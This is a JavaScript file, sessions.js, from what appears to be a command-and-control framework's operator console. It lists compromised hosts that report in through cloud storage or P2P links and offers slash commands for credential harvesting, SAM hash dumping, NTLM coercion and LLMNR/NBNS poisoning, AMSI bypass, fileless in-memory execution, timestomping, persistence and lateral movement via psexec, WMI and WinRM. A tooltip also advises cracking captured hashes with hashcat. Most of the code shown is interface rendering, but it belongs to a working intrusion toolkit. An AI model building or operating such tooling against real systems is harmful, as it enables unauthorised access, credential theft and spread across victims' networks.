/* ─────────────────────────────────────────────────────────────────────────────
   sessions.js — Sessions table + session detail panel
───────────────────────────────────────────────────────────────────────────── */

const Sessions = (() => {
  let _sessions   = {};
  let _activeId        = null;
  let _hbTimer         = null;
  let _cmdHistory      = [];
  let _cmdHistIdx      = -1;
  const _persistCheckIds   = new Set();   // cmd_ids for in-flight /persist check calls
  const _persistProbeIds   = new Map();   // cmd_id → 'all'|'selected'
  const _persistCmdIds     = new Map();   // cmd_id → { op:'status'|'install'|'remove', tid, sid }
  const _sysinfoRunning    = new Set();   // cmd_ids for in-flight /sysinfo calls
  const _persistProbeData  = {};          // session_id → { id: {id,status,priv,desc} }
  const _persistSelections = {};          // session_id → Set<technique id>
  const _downloadCmdIds  = new Set();
  const _localCmdIds     = new Set();  // server cmd_ids promoted by THIS browser
  const _noResponseIds   = new Set();  // cmd_ids for fire-and-forget (KILL/EXIT) — suppress pending bar
  const _deletingUploads = new Map();  // cmd_id → {remote_path, rowEl}
  const _listenActive    = {};         // session_id → { listeners: {key→{proto,port,started_at,creds}}, _dirty }  (live badge state)
  let   _exfilShowPath   = false;
  let _suggestItems = [];
  let _suggestIdx   = -1;
  let _resizingCol  = false;         // prevents drag while col-resize active
  let _stagedFile   = null;          // File object stashed after file picker (for /bof, /assembly, /memexec)
  let _shellUserScrolled = false;    // true when user has manually scrolled up

  /* ── session table column definitions ────────────────────────────────────── */
  const _SESS_COLS = [
    { key: 'status',   th: '' },
    { key: 'provider', th: 'Provider' },
    { key: 'label',    th: 'Label' },
    { key: 'id',       th: 'ID' },
    { key: 'user',     th: 'User' },
    { key: 'host',     th: 'Host' },
    { key: 'domain',   th: 'Domain' },
    { key: 'os',       th: 'OS' },
    { key: 'int_ip',   th: 'Int IP' },
    { key: 'ext_ip',   th: 'Ext IP' },
    { key: 'pid',      th: 'PID' },
    { key: 'process',  th: 'Process' },
    { key: 'last_hb',  th: 'Last HB' },
    { key: 'next_ci',  th: 'Next Checkin' },
  ];
  const _SESS_COL_KEYS = _SESS_COLS.map(c => c.key);
  let _sessColOrder = (() => {
    try {
      const saved = JSON.parse(localStorage.getItem('sess-col-order'));
      if (Array.isArray(saved) && saved.length === _SESS_COL_KEYS.length
          && _SESS_COL_KEYS.every(k => saved.includes(k))) return saved;
    } catch (_) {}
    return [..._SESS_COL_KEYS];
  })();

  /* ── slash-command definitions (used by suggester) ───────────────────────── */
  const _SLASH_DEFS = [
    { cmd: '/sysinfo',   hint: '',                          desc: 'Full system enumeration' },
    { cmd: '/status',    hint: '',                          desc: 'Session state & channel info' },
    { cmd: '/sleep',     hint: '<seconds>',                 desc: 'Check-in interval (1–86400s)',     req: 1 },
    { cmd: '/jitter',    hint: '<percent>',                 desc: 'Jitter % (0–50)',                  req: 1 },
    { cmd: '/download',  hint: '<remote_path>',             desc: 'Download file from target',        req: 1 },
    { cmd: '/upload',    hint: '[remote_dest]',              desc: 'Upload local file to agent' },
    { cmd: '/timestomp', hint: '<target> <ref>',            desc: 'Copy timestamps target←ref',       req: 2 },
    { cmd: '/persist',   hint: 'probe|install <id>|remove <id>|status <id>|check',  desc: 'Persistence engine', req: 1, opts: ['probe', 'install', 'remove', 'status', 'check'] },
    { cmd: '/creds',     hint: 'harvest [decrypt]|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', desc: 'Credential harvesting', req: 1, opts: [
      { name: 'harvest',           desc: 'Collect creds — Firefox/cloud/SSH/FileZilla/mRemoteNG/PS history/Git...' },
      { name: 'harvest decrypt',   desc: 'OPSEC↑ Also decrypt Chrome/Edge/DPAPI via CryptUnprotectData (Win)' },
      { name: 'coerce',            desc: 'Force local auth to capture NTLMv2 / SSH agent' },
      { name: 'sam',               desc: 'In-memory SAM hash extraction (Win, SYSTEM req)' },
      { name: 'listen start',      desc: 'Start listener — smb:445, http:80 (Basic), http-ntlm:80 (NTLMv2)' },
      { name: 'listen stop',       desc: 'Stop all listeners, or specific: listen stop http:80' },
      { name: 'listen dump',       desc: 'Captured credentials (Basic plaintext + NTLMv2 hashes) + poisoner stats' },
    ] },
    { cmd: '/bof',       hint: '<file.obj> [args]',         desc: 'Execute BOF/COFF in-memory (Win)' },
    { cmd: '/assembly',  hint: '<file.exe> [args]',         desc: 'Execute .NET assembly in-memory — .NET only (Win)' },
    { cmd: '/assembly-amsibypass', hint: '<file.exe> [args]', desc: 'Execute .NET assembly with AMSI bypass (Win)' },
    { cmd: '/memexec',   hint: '<file> [args]',             desc: 'Execute PE/ELF in-memory (Win+Linux)' },
    { cmd: '/script',    hint: '<file> [interpreter]',      desc: 'Execute script fileless via stdin pipe (Win+Linux)' },
    { cmd: '/script-amsibypass', hint: '<file> [interpreter]', desc: 'Execute script fileless + AMSI bypass (Win PS only)' },
    { cmd: '/jump',      hint: '<module> <target> [opts]',   desc: 'Lateral movement — deploy P2P child', req: 2, opts: [
      { name: 'ssh',               desc: 'SSH — deploy via scp + ssh exec (Linux)' },
      { name: 'psexec',            desc: 'PsExec — SMB ADMIN$ + service creation (Win)' },
      { name: 'psexec_psh',        desc: 'PsExec+PS — SMB ADMIN$ + PowerShell exec (Win)' },
      { name: 'wmi',               desc: 'WMI — SMB ADMIN$ + wmic process create (Win)' },
      { name: 'scshell',           desc: 'SCShell — hijack existing service binary (Win)' },
      { name: 'winrm',             desc: 'WinRM — remote exec via winrs (Win)' },
    ] },
    { cmd: '/generate-listener', hint: '[opts]',              desc: 'Build standalone P2P listener beacon', opts: [
      { name: 'tcp',               desc: 'TCP listener (default)' },
      { name: 'smb',               desc: 'SMB named pipe listener (Windows)' },
    ] },
    { cmd: '/kill',      hint: '',                          desc: 'Wipe agent + terminate' },
    { cmd: '/kill-cascade', hint: '',                       desc: 'Kill session + all P2P descendants' },
    { cmd: '/p2p',         hint: 'link tcp <addr:port> | link smb <target> [pipe] | unlink <guid>',    desc: 'Link/unlink P2P child' },
    { cmd: '/stop',      hint: '',                          desc: 'Stop agent, files remain' },
    { cmd: '/history',   hint: '',                          desc: 'Switch to History tab' },
    { cmd: '/clear',     hint: '',                          desc: 'Clear shell output' },
    { cmd: '/help',      hint: '',                          desc: 'Show help' },
  ];

  /* ── command suggester ───────────────────────────────────────────────────── */
  function _suggestHide() {
    const box = document.getElementById('cmd-suggest');
    if (box) { box.innerHTML = ''; box.classList.remove('open'); }
    _suggestItems = [];
    _suggestIdx   = -1;
  }

  function _suggestRenderActive() {
    document.querySelectorAll('#cmd-suggest .cs-item').forEach((el, i) => {
      el.classList.toggle('active', i === _suggestIdx);
    });
  }

  function _suggestAccept(idx) {
    const inp = document.getElementById('cmd-in');
    if (!inp) return;
    const it = _suggestItems[idx >= 0 ? idx : 0];
    if (!it) return;
    inp.value = it.fill;
    inp.focus();
    _suggestHide();
    _suggestUpdate(inp.value);
  }

  function _suggestMove(dir) {
    if (!_suggestItems.length) return false;
    _suggestIdx = Math.max(-1, Math.min(_suggestItems.length - 1, _suggestIdx + dir));
    _suggestRenderActive();
    return true;
  }

  function _suggestShowItems(items) {
    const box = document.getElementById('cmd-suggest');
    if (!box || !items.length) { _suggestHide(); return; }
    _suggestItems = items;
    _suggestIdx   = -1;
    box.innerHTML = items.map((it, i) =>
      `<div class="cs-item" data-i="${i}">` +
        `<span class="cs-cmd">${escHtml(it.label)}</span>` +
        (it.hint ? `<span class="cs-hint">${escHtml(it.hint)}</span>` : '') +
        (it.desc ? `<span class="cs-desc">${escHtml(it.desc)}</span>` : '') +
      `</div>`
    ).join('');
    box.classList.add('open');
    box.querySelectorAll('.cs-item').forEach((el, i) => {
      el.addEventListener('mousedown', e => { e.preventDefault(); _suggestAccept(i); });
    });
  }

  function _suggestShowHint(def) {
    const box = document.getElementById('cmd-suggest');
    if (!box) return;
    _suggestItems = [];
    _suggestIdx   = -1;
    box.innerHTML =
      `<div class="cs-hint-row">` +
        `<span class="cs-cmd">${escHtml(def.cmd)}</span>` +
        `<span class="cs-hint">${escHtml(def.hint)}</span>` +
        `<span class="cs-desc">${escHtml(def.desc)}</span>` +
      `</div>`;
    box.classList.add('open');
  }

  function _persistTechniqueItems(subCmd, partial) {
    const os      = _detectPersistOs();
    const catalog = os ? (_PERSIST_CATALOG[os] || []) : [];
    const probe   = _activeId ? (_persistProbeData[_activeId] || {}) : {};
    const q       = (partial || '').toLowerCase();
    return catalog
      .filter(t => t.id.startsWith(q))
      .map(t => {
        const probeEntry = probe[t.id];
        const status     = probeEntry?.status;
        const privLabel  = t.priv === 'root' ? '[admin] ' : '[user]  ';
        const statusHint = status ? ` · ${status}` : '';
        return {
          label: t.id,
          hint:  privLabel + t.name + statusHint,
          desc:  '',
          fill:  `/persist ${subCmd} ${t.id}`,
        };
      });
  }

  function _suggestUpdate(val) {
    if (!val.startsWith('/')) { _suggestHide(); return; }
    const trimmed    = val.trimEnd();
    const parts      = trimmed.split(/\s+/);
    const hasSpace   = val.length > trimmed.length || parts.length > 1;

    if (!hasSpace) {
      const q       = parts[0].toLowerCase();
      const matches = _SLASH_DEFS.filter(d => d.cmd.startsWith(q));
      _suggestShowItems(matches.map(d => ({
        label: d.cmd, hint: d.hint, desc: d.desc,
        fill:  d.cmd + (d.hint || d.req ? ' ' : ''),
      })));
    } else {
      const cmdName = parts[0].toLowerCase();
      const def     = _SLASH_DEFS.find(d => d.cmd === cmdName);
      if (!def) { _suggestHide(); return; }

      // /persist install|remove|status <technique-id> — show OS-specific techniques
      if (cmdName === '/persist' && parts.length >= 2) {
        const sub = parts[1].toLowerCase();
        if (['install', 'remove', 'status'].includes(sub)) {
          if (parts.length === 2 && val.endsWith(' ')) {
            // "/persist install " — show all techniques for this OS
            _suggestShowItems(_persistTechniqueItems(sub, ''));
          } else if (parts.length === 3) {
            // "/persist install cro…" — filter by partial id
            _suggestShowItems(_persistTechniqueItems(sub, parts[2]));
          } else {
            _suggestHide();
          }
          return;
        }
      }

      if (def.opts) {
        const filter = parts.length > 1 ? parts.slice(1).join(' ').toLowerCase() : '';
        const isObj = def.opts.length && typeof def.opts[0] === 'object';
        const matches = isObj
          ? def.opts.filter(o => o.name.startsWith(filter))
          : def.opts.filter(o => o.startsWith(filter));
        _suggestShowItems(matches.map(o => isObj
          ? ({ label: o.name, hint: '', desc: o.desc, fill: `${cmdName} ${o.name}` })
          : ({ label: o, hint: '', desc: '', fill: `${cmdName} ${o}` })
        ));
      } else if (def.hint) {
        _suggestShowHint(def);
      } else {
        _suggestHide();
      }
    }
  }

  /* ── OS helpers ──────────────────────────────────────────────────────────── */
  const _PROVIDER_LABELS = {
    googledrive: 'GoogleDrive',
    onedrive:    'OneDrive',
    sharepoint:  'SharePoint',
    s3:          'AWS S3',
    dropbox:     'Dropbox',
  };
  function _providerLabel(p) {
    return _PROVIDER_LABELS[(p || '').toLowerCase()] || p || '—';
  }

  function _osClass(osInfo) {
    if (!osInfo) return 'lin';
    const o = osInfo.toLowerCase();
    if (o.includes('windows')) return 'win';
    if (o.includes('darwin') || o.includes('mac')) return 'mac';
    return 'lin';
  }

  function _osLabel(osInfo) {
    if (!osInfo) return '—';
    return osInfo.split(' ')[0] || osInfo;
  }

  function _prompt(osInfo, processName, privs) {
    const proc = (processName || '').toLowerCase().replace(/\.exe$/, '');
    if (proc === 'powershell' || proc === 'pwsh') return 'PS>';
    if (proc === 'cmd')                           return 'cmd>';
    if ((osInfo || '').toLowerCase().includes('windows'))    return 'cmd>';
    if ((privs  || '').toLowerCase() === 'root')             return '#';
    return '$';
  }

  function _shortCwd(path) {
    if (!path) return '';
    const clean = path.replace(/[/\\]+$/, '');
    const sep   = clean.includes('\\') ? '\\' : '/';
    const parts = clean.split(/[/\\]/);
    const last  = parts[parts.length - 1] || sep;
    return parts.length <= 1 ? last : `…${sep}${last}`;
  }

  function _isAdmin(profile) {
    const priv = (profile?.privilege || '').toLowerCase();
    const user = (profile?.username  || '').toLowerCase();
    return priv.includes('admin') || user === 'root' || user === 'system' || user === 'nt authority\\system';
  }

  /* ── tab switching ───────────────────────────────────────────────────────── */
  function _switchTab(name) {
    $$('.tab').forEach(b => b.classList.toggle('on', b.dataset.tab === name));
    $$('.tab-pane').forEach(p => p.classList.toggle('on', p.id === `tp-${name}`));
    if (name === 'artifacts') _loadArtifacts();
    if (name === 'info')      _renderInfo();
    if (name === 'persist')   _renderPersist();
    if (name === 'control')   _renderControl();
    if (name === 'history')   _renderHistory();
    if (name === 'creds')     _loadCreds();
  }

  function _sessionStatus(s) {
    if (s.p2p_is_internal) return s.state === 'linked' ? 'linked' : (s.state || 'stopped');
    if (s.polling_stopped) {
      if (s.state === 'linked') return 'linked';
      return 'stopped';
    }
    if (s.state === 'cloud_unreachable') return 'cloud_unreachable'; // LOW-7
    const ts = s._localSeenAt ? String(s._localSeenAt)
             : (s.last_seen_at != null) ? String(s.last_seen_at)
             : (s.last_hb_ts || '');
    return agentStatus({ last_heartbeat: ts }, s.agent_sleep);
  }

  function _stLabel(st) {
    const dot = '<span class="st-circle"></span>';
    if (st === 'alive')              return `${dot}LIVE`;
    if (st === 'idle')               return `${dot}IDLE`;
    if (st === 'linked')             return `${dot}LINK`;
    if (st === 'stopped')            return `${dot}STOP`;
    if (st === 'cloud_unreachable')  return `${dot}CLOUD`;
    return `${dot}DEAD`;
  }

  /* ── sessions table ──────────────────────────────────────────────────────── */
  function renderList() {
    const tbody  = $('#sess-tbody');
    const statEl = $('#stat-sessions-n');
    if (!tbody) return;

    const ids = Object.keys(_sessions);
    if (statEl) statEl.textContent = `${ids.length} session${ids.length !== 1 ? 's' : ''}`;

    const statsEl = $('#pane-sess-stats');
    if (statsEl && ids.length) {
      let alive = 0, idle = 0, offline = 0, stopped = 0, linked = 0;
      ids.forEach(id => {
        const s  = _sessions[id];
        const st = _sessionStatus(s);
        if (st === 'stopped')            { stopped++; return; }
        if (st === 'linked')             { linked++; return; }
        if (st === 'alive')              alive++;
        else if (st === 'idle')          idle++;
        else                             offline++;  // offline + cloud_unreachable both count as offline in stats
      });
      const chip = (cls, n, lbl) =>
        `<span class="ps-chip ${cls}"><span class="ps-dot"></span>${n} ${lbl}</span>`;
      statsEl.innerHTML =
        chip('ps-alive', alive,   'alive')   +
        chip('ps-idle',  idle,    'idle')    +
        (linked ? chip('ps-linked', linked, 'linked') : '') +
        chip('ps-off',   offline, 'offline') +
        chip('ps-stop',  stopped, 'stop');
    } else if (statsEl) {
      statsEl.innerHTML = '';
    }

    $$('tr', tbody).forEach(r => r.remove());

    // Rebuild thead according to current column order
    const tbl = $('#sess-table');
    const theadTr = tbl?.querySelector('thead tr');
    if (theadTr) {
      theadTr.innerHTML = _sessColOrder.map(key => {
        const col = _SESS_COLS.find(c => c.key === key);
        return col ? `<th data-col="${key}" draggable="true">${col.th}</th>` : '';
      }).join('');
    }

    const emptyMsg = $('#sess-empty-msg');
    if (!ids.length) {
      if (emptyMsg) emptyMsg.style.display = '';
      _initColResize('sess-table', 'colw:sess-table');
      _initSessColDrag();
      return;
    }
    if (emptyMsg) emptyMsg.style.display = 'none';

    ids.forEach(id => {
      const s      = _sessions[id];
      const hbTs   = s.last_hb_ts || '';
      const seenTs = s._localSeenAt ? String(s._localSeenAt)
                   : (s.last_seen_at != null) ? String(s.last_seen_at)
                   : hbTs;
      const st     = _sessionStatus(s);
      const prov   = s.provider || 'dropbox';
      const os     = s.target_os || '';
      const osCls  = _osClass(os);
      const osLbl  = _osLabel(os);
      const admin  = _isAdmin({ privilege: s.target_privs, username: s.target_user });
      const uid    = (s.id || id).slice(0, 6);
      const intIp  = s.target_ip     || '—';
      const extIp  = s.target_ip_ext || '—';
      const dom    = s.target_domain || '—';
      const chan   = (s.folder_path || '').replace(/^\/+|\/+$/g, '');
      const pid    = s.agent_pid     || '—';
      const proc   = (s.agent_process || '—').split(/[\\/]/).pop() || '—';

      const sleepMs    = (s.agent_sleep || 30) * 1000;
      const baseMsForNc = s._localSeenAt ? (s._localSeenAt * 1000) : _tsToMs(hbTs);
      const ncMs        = (baseMsForNc && !isNaN(baseMsForNc)) ? (baseMsForNc + sleepMs) : NaN;

      const tr = document.createElement('tr');
      if (id === _activeId) tr.classList.add('sel');
      tr.dataset.id = id;
      const lockIcon = s.locked ? '<span class="sess-lock" title="Session locked">🔒</span>' : '';
      const lbl = s.label || chan || '';
      const cellMap = {
        status:   `<td><span class="st-pill ${st}">${_stLabel(st)}</span>${lockIcon}</td>`,
        provider: s.p2p_is_internal
                    ? `<td class="sess-prov">P2P TCP</td>`
                    : `<td class="sess-prov">${providerIcon(prov, 'prov-icon')?.outerHTML || ''}${escHtml(_providerLabel(prov))}</td>`,
        label:    `<td class="sess-label">${escHtml(lbl || '—')}</td>`,
        id:       `<td class="sess-uid">${escHtml(uid)}</td>`,
        user:     `<td class="sess-user">${escHtml(s.target_user || '—')}${admin ? '<span class="priv-star">*</span>' : ''}</td>`,
        host:     `<td class="sess-host">${escHtml(s.target_host || '—')}</td>`,
        domain:   `<td class="sess-dom">${escHtml(dom)}</td>`,
        os:       `<td><span class="os-b ${osCls}">${escHtml(osLbl)}</span></td>`,
        int_ip:   `<td class="sess-ip">${escHtml(intIp)}</td>`,
        ext_ip:   `<td class="sess-ip">${escHtml(extIp)}</td>`,
        pid:      `<td class="sess-pid">${escHtml(pid)}</td>`,
        process:  `<td class="sess-proc">${escHtml(proc)}</td>`,
        last_hb:  s.p2p_is_internal
                    ? `<td class="hb-val">∞</td>`
                    : `<td class="hb-val" data-hb="${escHtml(seenTs)}">${fmtAge(seenTs || null)}</td>`,
        next_ci:  s.p2p_is_internal
                    ? `<td class="nc-val">∞</td>`
                    : `<td class="${st === 'stopped' ? 'nc-val nc-stopped' : 'nc-val'}" data-nc="${st === 'stopped' || isNaN(ncMs) ? '' : ncMs}">${st === 'stopped' ? '■ Stopped' : fmtUntil(ncMs)}</td>`,
      };
      tr.innerHTML = _sessColOrder.map(k => cellMap[k] || '').join('');
      if (s._wiping) {
        const pill = tr.querySelector('.st-pill');
        if (pill) { pill.className = 'st-pill wiping'; pill.textContent = '⟳ wiping'; }
      }
      tr.addEventListener('click', () => select(id));
      tbody.appendChild(tr);
    });

    _initColResize('sess-table', 'colw:sess-table');
    _initSessColDrag();
  }

  function _startHbTicker() {
    if (_hbTimer) clearInterval(_hbTimer);
    _hbTimer = setInterval(() => {
      $$('#sess-tbody td[data-hb]').forEach(td => {
        if (td.dataset.hb) td.textContent = fmtAge(td.dataset.hb);
      });
      $$('#sess-tbody td[data-nc]').forEach(td => {
        if (td.dataset.nc) td.textContent = fmtUntil(parseFloat(td.dataset.nc));
      });
      if (_activeId) {
        const s = _sessions[_activeId];
        if (s) {
          const dispTs = s._localSeenAt ? String(s._localSeenAt)
                     : (s.last_seen_at != null) ? String(s.last_seen_at)
                     : (s.last_hb_ts || '');
          if (!s.p2p_is_internal) {
            const hbV = $('#sh-meta [data-key="hb"] .v');
            if (hbV) hbV.textContent = fmtAge(dispTs);
            const infoHb = document.getElementById('info-hb-val');
            if (infoHb) infoHb.textContent = fmtAge(dispTs);
          }
        }
      }
    }, 1000);
  }

  /* ── select & detail ─────────────────────────────────────────────────────── */
  function select(id) {
    _activeId = id;
    _shellLastDate = null;
    renderList();

    const empty  = $('#empty-state');
    const hdr    = $('#sess-header');
    const tabBar = $('#tab-bar');
    const tabCnt = $('#tab-content');
    if (empty)  empty.style.display  = 'none';
    if (hdr)    hdr.style.display    = '';
    if (tabBar) tabBar.style.display = '';
    if (tabCnt) tabCnt.style.display = '';

    _renderDetail();
    _switchTab('shell');
    _loadHistory();

    /* fetch full detail to get agent_sleep, agent_jitter and other profile fields */
    API.session(id).then(detail => {
      if (!_sessions[id]) return;
      const MERGE = ['agent_sleep','agent_jitter','base_sleep','jitter_percent',
                     'input_file','output_file','heartbeat_file','folder_path',
                     'blob_path','blob_path_win','deploy_mode',
                     'kill_date','window_start','window_end'];
      MERGE.forEach(k => { if (detail[k] != null) _sessions[id][k] = detail[k]; });
      if (id === _activeId) _renderDetail();
    }).catch(() => {});
  }

  function _updatePollBtn(stopped) {
    const btn = $('#btn-poll-toggle');
    if (!btn) return;
    btn.textContent  = stopped ? '▶ Resume' : '■ Stop Poll';
    btn.className    = stopped ? 'btn-poll-toggle resuming' : 'btn-poll-toggle stopping';
    btn.title        = stopped ? 'Resume Dropbox polling' : 'Stop Dropbox polling for this session';
  }

  /* ── Listen badge (passive SMB listener indicator) ─────────────────────── */
  function _getListeners(sid) {
    // Merge persistent (from server session data) + live (from _listenActive)
    const sess = sid ? _sessions[sid] : null;
    const persistent = sess?.listeners || {};
    const live = _listenActive[sid]?.listeners || {};
    // Live overrides persistent (more recent creds count)
    const merged = { ...persistent, ...live };
    return Object.keys(merged).length ? merged : null;
  }

  function _updateListenBadge() {
    const badge = $('#listen-badge');
    if (!badge) return;
    const listeners = _activeId ? _getListeners(_activeId) : null;
    if (listeners && Object.keys(listeners).length) {
      badge.style.display = 'inline-flex';
      const keys = Object.keys(listeners);
      const count = keys.length;
      // Summary label
      const labelEl = badge.querySelector('.listen-badge-label');
      if (labelEl) labelEl.textContent = count === 1 ? keys[0].toUpperCase() : `${count} listeners`;

      // Build detailed tooltip
      let tip = `⚠ ${count} active listener${count > 1 ? 's' : ''} + LLMNR/NBNS poisoner\n\n`;
      for (const [key, info] of Object.entries(listeners)) {
        const since = info.started_at ? new Date(info.started_at).toLocaleString() : '?';
        const credsN = (info.creds || []).length;
        tip += `  ${key.toUpperCase()} — started ${since} — ${credsN} cred${credsN !== 1 ? 's' : ''}\n`;
      }
      tip += `\nOperator checklist:\n`;
      tip += `  1. /creds listen dump → retrieve captured hashes\n`;
      tip += `  2. /creds listen stop → stop all (or stop <proto:port>)\n`;
      tip += `  3. hashcat -m 5600 to crack NTLMv2`;
      badge.title = tip;

      // Expandable memo — compact: protocols, start time, total creds (no hashes)
      let memo = badge.querySelector('.listen-badge-memo');
      if (!memo) {
        memo = document.createElement('span');
        memo.className = 'listen-badge-memo';
        badge.appendChild(memo);
      }
      const protos = keys.map(k => k.toUpperCase());
      const earliest = Object.values(listeners).reduce((a, b) => {
        if (!a.started_at) return b; if (!b.started_at) return a;
        return a.started_at < b.started_at ? a : b;
      });
      const since = earliest.started_at ? new Date(earliest.started_at).toLocaleString() : '?';
      const totalCreds = Object.values(listeners).reduce((n, i) => n + (i.creds || []).length, 0);
      const protoLabel = count > 1 ? escHtml(protos.join(' + ')) + ' + LLMNR/NBNS' : 'LLMNR/NBNS poisoner active';
      memo.innerHTML = `<div class="listen-entry">${protoLabel} · since ${escHtml(since)} · ${totalCreds} cred${totalCreds !== 1 ? 's' : ''}</div>`;
    } else {
      badge.style.display = 'none';
      badge.removeAttribute('data-expanded');
    }
  }

  function _listenBadgeToggleExpand() {
    const badge = $('#listen-badge');
    if (!badge) return;
    if (badge.hasAttribute('data-expanded')) {
      badge.removeAttribute('data-expanded');
    } else {
      badge.setAttribute('data-expanded', '');
    }
  }

  function _renderDetail() {
    const s = _sessions[_activeId];
    if (!s) return;

    const dispTs = s._localSeenAt ? String(s._localSeenAt)
                 : (s.last_seen_at != null) ? String(s.last_seen_at)
                 : (s.last_hb_ts || '');
    const st = s.p2p_is_internal ? (s.state === 'linked' ? 'linked' : s.state || 'stopped')
              : s.polling_stopped ? (s.state === 'linked' ? 'linked' : 'stopped')
              : agentStatus({ last_heartbeat: dispTs }, s.agent_sleep);

    const folder = (s.folder_path || '').replace(/^\/+|\/+$/g, '') || _activeId.slice(0, 8);
    const displayName = s.label || folder;
    const hn = $('#sh-hostname');
    if (hn) hn.textContent = displayName;

    const pill    = $('#sh-status-pill');
    const pillTxt = $('#sh-status-txt');
    if (pill)    pill.className = `status-pill ${st}`;
    if (pillTxt) pillTxt.textContent = st;

    const pollBtn = $('#btn-poll-toggle');
    if (pollBtn) pollBtn.style.display = s.p2p_is_internal ? 'none' : '';
    if (!s.p2p_is_internal) _updatePollBtn(s.polling_stopped);
    _updateListenBadge();

    const vmWarn = $('#version-mismatch-warn');
    if (vmWarn) {
      const sv = window._serverVersion || '';
      const av = s.stratum_version || '';
      if (av && sv && av !== sv) {
        vmWarn.style.display = '';
        vmWarn.title = `Agent deployed with v${av}, server is v${sv} — consider re-deploying`;
      } else {
        vmWarn.style.display = 'none';
      }
    }

    const lockBtn = $('#btn-lock-toggle');
    if (lockBtn) {
      if (s.locked) {
        lockBtn.className = 'btn-lock-toggle locked';
        lockBtn.textContent = '🔒 Locked';
        lockBtn.title = 'Session locked — click to unlock';
      } else {
        lockBtn.className = 'btn-lock-toggle unlocked';
        lockBtn.textContent = '🔓 Lock';
        lockBtn.title = 'Lock session — prevent kill/stop/delete';
      }
    }

    const promptEl = $('#shell-prompt');
    if (promptEl) promptEl.textContent = _prompt(s.target_os, s.agent_process, s.target_privs);

    const meta = $('#sh-meta');
    if (meta) {
      const isP2P = !!s.p2p_is_internal;
      meta.innerHTML = `
      <div class="meta-kv"><span class="k">ID</span><span class="v">${escHtml(_activeId)}</span></div>
      <div class="meta-kv"><span class="k">Provider</span><span class="v">${isP2P ? 'P2P TCP' : escHtml(_providerLabel(s.provider))}</span></div>
      <div class="meta-kv" data-key="hb"><span class="k">Heartbeat</span><span class="v ${isP2P ? '' : (st === 'alive' ? 'good' : '')}">${isP2P ? '∞' : fmtAge(dispTs)}</span></div>
      ${isP2P ? '' : `<div class="meta-kv"><span class="k">Sleep</span><span class="v">${s.agent_sleep != null ? _fmtDuration(s.agent_sleep) : '?'}</span></div>
      <div class="meta-kv"><span class="k">Jitter</span><span class="v">${s.agent_jitter != null ? s.agent_jitter + '%' : '?'}</span></div>`}
      <div class="meta-kv"><span class="k">OS</span><span class="v">${escHtml(s.target_os || '?')}</span></div>`;
    }

    const pb = $('#pending-bar');
    if (pb) {
      const pc = s.pending_cmd;
      if (pc && !_noResponseIds.has(pc.cmd_id)) {
        pb.classList.add('visible');
        const pt = $('#pending-cmd-text');
        if (pt) { const t = pc.command; pt.textContent = t.length > 80 ? t.slice(0, 80) + '…' : t; }
      } else {
        pb.classList.remove('visible');
      }
    }
  }

  /* ── shell tab ───────────────────────────────────────────────────────────── */
  let _shellLastDate = null;

  function _pendingText(command) {
    const c = command || '';
    if (!c.startsWith('/')) return 'message sent';
    if (c === '/sysinfo') return '/sysinfo queued — response arrives in shell';
    if (c === '/stop')    return '/stop queued — agent will exit';
    if (c === '/kill')    return '/kill queued — agent will terminate';
    const base = c.split(' ')[0];
    if ((base === '/bof' || base === '/assembly' || base === '/assembly-amsibypass' || base === '/memexec' || base === '/script' || base === '/script-amsibypass') && c.split(/\s+/).length < 2)
      return `${base} — select file…`;
    return `${c} queued`;
  }

  function _appendOutput(cmdBlock) {
    const hist = $('#shell-hist');
    if (!hist) return;

    // Date divider when the day changes
    if (cmdBlock.ts) {
      try {
        const d = new Date(cmdBlock.ts).toLocaleDateString('en-GB', { timeZone: _opTz, day: '2-digit', month: 'short', year: 'numeric' });
        if (d && d !== _shellLastDate) {
          _shellLastDate = d;
          const sep = document.createElement('div');
          sep.className = 'ev';
          sep.innerHTML = `<span class="et i">📅 ${escHtml(d)}</span>`;
          hist.appendChild(sep);
        }
      } catch {}
    }

    const s      = _sessions[_activeId];
    const prompt = _prompt(s?.target_os, s?.agent_process, s?.target_privs);
    const div    = document.createElement('div');
    div.className = 'cb';

    const ts  = cmdBlock.ts  ? escHtml(fmtTs(cmdBlock.ts))           : '';
    const cid = cmdBlock.cmd_id ? escHtml(cmdBlock.cmd_id.slice(0,8)) : '';
    const op  = cmdBlock.operator ? escHtml(cmdBlock.operator) : '';
    const cmd = escHtml(cmdBlock.command || '');
    const outId = `out-${escHtml(cmdBlock.cmd_id || '')}`;

    const cwd = _shortCwd(s?.remote_cwd);
    const hdrLabel = `<span class="cc">${cwd ? `<span class="ccwd">${escHtml(cwd)}</span>` : ''}<span class="cp">${escHtml(prompt)}</span>&nbsp;${cmd}</span>`;

    const hdr = `<div class="cm">
      ${ts  ? `<span class="ct">[${ts}]</span>`   : ''}
      ${op  ? `<span class="cop2">[${op}]</span>` : ''}
      ${cid ? `<span class="cid">[${cid}]</span>` : ''}
      ${hdrLabel}
    </div>`;

    const shortId     = (cmdBlock.cmd_id || '').slice(0, 8);
    const isSlashCmd  = (cmdBlock.command || '').startsWith('/');
    const slashBase   = isSlashCmd ? (cmdBlock.command || '').split(' ')[0] : '';
    const isFilePick  = slashBase === '/bof' || slashBase === '/assembly' || slashBase === '/assembly-amsibypass' || slashBase === '/memexec' || slashBase === '/script' || slashBase === '/script-amsibypass';
    const pendClass   = (cmdBlock.pending && isSlashCmd && !isFilePick) ? 'queued' : 'pending';
    const pendText    = escHtml(_pendingText(cmdBlock.command));
    const outputHtml  = cmdBlock.output
      ? `<span class="co-out-label">Output:</span>\n${escHtml(cmdBlock.output)}`
      : escHtml(cmdBlock.output || '');
    const body = cmdBlock.pending
      ? `<div class="co ${pendClass}" id="${outId}"><span class="cid">[${shortId}]</span> <span class="cs-star">*</span> ${pendText}</div>`
      : `<div class="co${cmdBlock.isError ? ' error' : ' hi'}" id="${outId}"><span class="cid">[${shortId}]</span> ${outputHtml}</div>`;

    div.innerHTML = hdr + body;
    hist.appendChild(div);
  }

  function _setOutput(cmd_id, content, isError = false) {
    const outEl = document.getElementById(`out-${cmd_id}`);
    if (!outEl) return;
    const blank  = !isError && (!content || !content.trim());
    const exitOk = !isError && /^\[exit code: 0\]\s*$/.test(content || '');
    const prefix = `<span class="cid">[${cmd_id.slice(0, 8)}]</span> `;
    if (blank || exitOk) {
      outEl.innerHTML = prefix + '✓  done — no output (exit 0)';
    } else {
      outEl.innerHTML = prefix + `<span class="co-out-label">Output:</span>\n` + escHtml(content);
    }
    outEl.classList.remove('pending', 'queued');
    delete outEl.dataset.active;
